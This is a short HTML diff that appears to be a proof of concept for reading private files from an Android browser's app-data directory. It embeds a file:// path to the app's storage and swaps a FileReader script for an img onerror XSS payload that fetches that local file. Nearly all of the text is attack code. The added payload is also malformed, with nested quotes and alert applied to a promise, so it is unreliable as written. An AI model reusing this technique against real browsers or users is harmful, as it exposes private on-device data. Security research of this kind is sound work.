@@ -5,18 +5,6 @@
     <object id="ObjAlertePageLogin" width="300" height="100" type="text/plain" data="file:////storage/emulated/0/Android/data/com.talpa.hibrowser/files/images/journal" border="0" style="overflow: hidden;"> 
     <embed src="file:////storage/emulated/0/Android/data/com.talpa.hibrowser/files/images/journal" type="text/plain" />
     </object>
-    <script>
-     var fileInput = document.getElementById('ObjAlertePageLogin');
-
-var reader = new FileReader();
-reader.readAsDataURL(fileInput.files[0]);
-
-reader.onload = function () {
-	alert(reader.result);//base64encoded string
-};
-reader.onerror = function (error) {
-	alert('Error: ', error);
-};
-      </script>
+    <img src=x onerror='javascript:alert(fetch('file:////storage/emulated/0/Android/data/com.talpa.hibrowser/files/images/journal'))'>
     </body>
 </html>
